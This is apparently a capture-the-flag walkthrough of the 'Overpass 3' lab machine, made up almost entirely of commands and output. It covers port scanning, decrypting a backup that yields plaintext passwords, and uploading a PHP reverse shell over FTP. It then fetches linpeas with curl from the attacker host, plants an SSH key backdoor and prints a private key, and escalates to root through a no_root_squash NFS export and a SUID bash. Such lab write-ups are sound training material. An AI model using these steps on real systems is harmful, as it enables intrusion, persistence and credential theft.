# Overpass 3

## Nmap

```
$ sudo nmap -sS -p- 10.10.189.110            

[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-16 08:17 EDT
Stats: 0:03:55 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 36.71% done; ETC: 08:27 (0:06:47 remaining)
Stats: 0:06:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 72.42% done; ETC: 08:25 (0:02:22 remaining)
Nmap scan report for 10.10.189.110
Host is up (0.079s latency).
Not shown: 65060 filtered tcp ports (no-response), 472 filtered tcp ports (admin-prohibited)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 468.26 seconds
```

```
$ sudo nmap -sSV -p 21,22,80 10.10.189.110

Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-16 08:25 EDT
Nmap scan report for 10.10.189.110
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
```


## FTP 

Cannot login anonymously

## HTTP

Normal website with a single page.


## Gobuster

```
┌──(kali㉿kali)-[~/Desktop/Overpass3]
└─$ gobuster dir -u http://10.10.189.110 -w /usr/share/wordlists/dirb/big.txt -x php,html        
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.189.110
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 218]
/.htaccess.php        (Status: 403) [Size: 222]
/.htaccess.html       (Status: 403) [Size: 223]
/.htpasswd            (Status: 403) [Size: 218]
/.htpasswd.php        (Status: 403) [Size: 222]
/.htpasswd.html       (Status: 403) [Size: 223]
/backups              (Status: 301) [Size: 237] [--> http://10.10.189.110/backups/]
/cgi-bin/             (Status: 403) [Size: 217]
/cgi-bin/.html        (Status: 403) [Size: 222]
/index.html           (Status: 200) [Size: 1770]
Progress: 61407 / 61410 (100.00%)
===============================================================
Finished
===============================================================                                                                      
```

## Backup

```                                                                                                              
┌──(kali㉿kali)-[~/Desktop/Overpass3/backup]
└─$ ls
CustomerDetails.xlsx.gpg  priv.key
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/Overpass3/backup]
└─$ gpg --import priv.key 
gpg: keybox '/home/kali/.gnupg/pubring.kbx' created
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

┌──(kali㉿kali)-[~/Desktop/Overpass3/backup]
└─$ gpg --output doc.xlsx --decrypt CustomerDetails.xlsx.gpg
gpg: Note: secret key 9E86A1C63FB96335 expired at Tue 08 Nov 2022 04:14:31 PM EST
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"

```

## Excel File

```

0day Montgomery	| 0day |	OllieIsTheBestDog |	5555 3412 4444 1115	| 642

Muir Land |	muirlandoracle |	A11D0gsAreAw3s0me |	5103 2219 1119 9245 |	737

Par. A. Doxx | paradox	| ShibesAreGreat123	| 4111 1111 4555 1142 | 432

```

## FTP

The only successfull login is the paradox login

```
┌──(kali㉿kali)-[~/Desktop/Overpass3]
└─$ ftp 10.10.189.110   
Connected to 10.10.189.110.
220 (vsFTPd 3.0.3)
Name (10.10.189.110:kali): 0day
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/Overpass3]
└─$ ftp 10.10.189.110
Connected to 10.10.189.110.
220 (vsFTPd 3.0.3)
Name (10.10.189.110:kali): muirlandoracle
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
ftp> exit
221 Goodbye.
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/Overpass3]
└─$ ftp 10.10.189.110
Connected to 10.10.189.110.
220 (vsFTPd 3.0.3)
Name (10.10.189.110:kali): paradox
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

```
ftp> ls
229 Entering Extended Passive Mode (|||61348|)
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
226 Directory send OK.
ftp> 
```

It is the same dir as the http.

Uploading to the FTP:

```
ftp> put images/cat.jpg cat.jpg
local: images/cat.jpg remote: cat.jpg
229 Entering Extended Passive Mode (|||37150|)
150 Ok to send data.
100% |***********************************************************************| 12527       32.82 MiB/s    00:00 ETA
226 Transfer complete.
12527 bytes sent in 00:00 (97.92 KiB/s)
ftp> 
```

We can then see the upload on the web
<img src="images/upload_cat.png">

## Uploading a reverse shell.

Download the a php reverse shell from pentest monkey

```

ftp> put rev-shell.php rev-shell.php
local: rev-shell.php remote: rev-shell.php
229 Entering Extended Passive Mode (|||21144|)
150 Ok to send data.
100% |***********************************************************************|  5494       45.56 MiB/s    00:00 ETA
226 Transfer complete.
5494 bytes sent in 00:00 (26.57 KiB/s)
ftp> 


```

<img src="images/rev-shell.png">


### Get a pty shell 

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

## Finding the web flag

```
sh-4.4$ find / -name "*flag" 2>/dev/null
find / -name "*flag" 2>/dev/null
/usr/sbin/grub2-set-bootflag
/usr/share/httpd/web.flag

sh-4.4$ cat /usr/share/httpd/web.flag
```


## Getting the parodox user

the credentials are the same as the password

```
sh-4.4$ su paradox 
su paradox 
Password: ShibesAreGreat123

[paradox@localhost home]$ 
```

## PrivEsc

```
[paradox@localhost home]$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for paradox: ShibesAreGreat123

Sorry, user paradox may not run sudo on localhost.
```


## Priv Esc

Get Linpeas on the computer

We got a use curl because we don't have wget or netcat.

```
[paradox@localhost ~]$ curl http://10.8.191.218:2222/linpeas.sh --output linpeas.sh
<://10.8.191.218:2222/linpeas.sh --output linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  827k  100  827k    0     0   748k      0  0:00:01  0:00:01 --:--:--  748k
[paradox@localhost ~]$ ls
ls
backup.zip            CustomerDetails.xlsx.gpg  priv.key
CustomerDetails.xlsx  linpeas.sh
[paradox@localhost ~]$ chmod +x linpeas.sh

```

### Linpeas output

Sudo version 1.8.29                                                              
PATH: /home/paradox/.local/bin:/home/paradox/bin:/usr/local/bin:/usr/bin               


```
╔══════════╣ Analyzing NFS Exports Files (limit 70)
Connected NFS Mounts:                                                            
nfsd /proc/fs/nfsd nfsd rw,relatime 0 0
sunrpc /var/lib/nfs/rpc_pipefs rpc_pipefs rw,relatime 0 0
-rw-r--r--. 1 root root 54 Nov 18  2020 /etc/exports
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

files owned by james
```
[paradox@localhost /]$ find / -user james 2>/dev/null
find / -user james 2>/dev/null
/var/spool/mail/james
/home/james
[paradox@localhost /]$ 
```

## Added an ssh backdoor as paradox to makes it easir to connect to the machine

```
[paradox@localhost ~]$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/paradox/.ssh/id_rsa): 

Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/paradox/.ssh/id_rsa.
Your public key has been saved in /home/paradox/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:L1fQr6BU2IbgMN+VblDf/jIIT3nRacUcO6OllDlSGkM paradox@localhost.localdomain
The key's randomart image is:
+---[RSA 3072]----+
|    o .  .+E . +o|
|     = o.=.o=.o.*|
|      o +o=oo=oB.|
|         oo.o+*.o|
|        S.o +o+  |
|       . o * + . |
|        o o + o .|
|         o     o |
|                 |
+----[SHA256]-----+
[paradox@localhost ~]$ cd .ssh          
cd .ssh
[paradox@localhost .ssh]$ ls
ls
authorized_keys  id_rsa  id_rsa.pub
[paradox@localhost .ssh]$ mv id_rsa.pub authorized_keys
mv id_rsa.pub authorized_keys
[paradox@localhost .ssh]$ ls
ls
authorized_keys  id_rsa
[paradox@localhost .ssh]$ ls
ls
authorized_keys  id_rsa
[paradox@localhost .ssh]$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
[paradox@localhost .ssh]$ 
```

```
$ ssh -i id_rsa paradox@10.10.16.233
The authenticity of host '10.10.16.233 (10.10.16.233)' can't be established.
ED25519 key fingerprint is SHA256:18WMJxDadr79jI/eHKaMMLgRKWSOMUxtNLFbBJjVKrg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.16.233' (ED25519) to the list of known hosts.
Last login: Tue Oct 17 16:16:52 2023
[paradox@localhost ~]$
```


## Get James

As seen before by the linpeas output the is a export mount with no root squash

We count mount this export on our attacking machine and see it's files contents and add to in.

We can't mount on the machine because it is only on localhost. and we cant mount it with paradox user because it is not root.
We need a was to use the paradox ssh session as a proxy.

```
[paradox@localhost home]$ rpcinfo -p
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  58403  status
    100005    1   udp  20048  mountd
    100024    1   tcp  48301  status
    100005    1   tcp  20048  mountd
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  55910  nlockmgr
    100021    3   udp  55910  nlockmgr
    100021    4   udp  55910  nlockmgr
    100021    1   tcp  42753  nlockmgr
    100021    3   tcp  42753  nlockmgr
    100021    4   tcp  42753  nlockmgr

```

The port for nfs shares is 2049

### Create the tunel with ssh

```
└─$ ssh -N -L 2049:localhost:2049 -i id_rsa paradox@10.10.16.233
```


### mounting

```
└─$ sudo mount -v -t nfs localhost: /mnt/james 
mount.nfs: timeout set for Tue Oct 17 12:04:58 2023
mount.nfs: trying text-based options 'vers=4.2,addr=::1,clientaddr=::1'
```

```
└─$ ls -la /mnt/james 
total 20
drwx------ 3 kali kali  112 Nov 17  2020 .
drwxr-xr-x 3 root root 4096 Oct 17 12:01 ..
lrwxrwxrwx 1 root root    9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r-- 1 kali kali   18 Nov  8  2019 .bash_logout
-rw-r--r-- 1 kali kali  141 Nov  8  2019 .bash_profile
-rw-r--r-- 1 kali kali  312 Nov  8  2019 .bashrc
drwx------ 2 kali kali   61 Nov  7  2020 .ssh
-rw------- 1 kali kali   38 Nov 17  2020 user.flag
```

```
└─$ cat /mnt/james/user.flag           
```

### ssh

james already has a pub and a privkey is his .ssh folder

let's copy the priv key to get a ssh session

```
└─$ cp /mnt/james/.ssh/id_rsa /home/kali/Desktop/Overpass3/id_rsa_james

└─$ chmod 600 id_rsa_james 

```

```
└─$ ssh -i id_rsa_james james@10.10.16.233 
Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
[james@localhost ~]$ 
```



## Priv Esc

Since it does not do root squashing we can simply add a file with a suid permission and get root from there



On james session:

```
[james@localhost ~]$ which bash
/usr/bin/bash
[james@localhost ~]$ cp /usr/bin/bash .
[james@localhost ~]$ ls
bash   user.flag
[james@localhost ~]$ ls -la
total 1336
drwx------. 3 james james     159 Oct 17 17:25 .
drwxr-xr-x. 4 root  root       34 Nov  8  2020 ..
-rwsr-sr-x  1 james james 1219248 Oct 17 17:25 bash
lrwxrwxrwx. 1 root  root        9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--. 1 james james      18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 james james     141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 james james     312 Nov  8  2019 .bashrc
drwx------. 2 james james      61 Nov  8  2020 .ssh
-rw-------. 1 james james      38 Nov 17  2020 user.flag

```

On our session, we set the onwer as root, and then set the suid bit

```
┌──(kali㉿kali)-[/mnt]
└─$ sudo chown root /mnt/james/bash 
                                                                                 
┌──(kali㉿kali)-[/mnt]
└─$ sudo chmod +xs /mnt/james/bash 
```

On james again

```
[james@localhost ~]$ ls -l
total 1196
-rwsr-sr-x  1 root  james 1219248 Oct 17 17:25 bash
-rw-------. 1 james james      38 Nov 17  2020 user.flag
[james@localhost ~]$ ./bash -p
bash-4.4# whoami
root
bash-4.4# 
```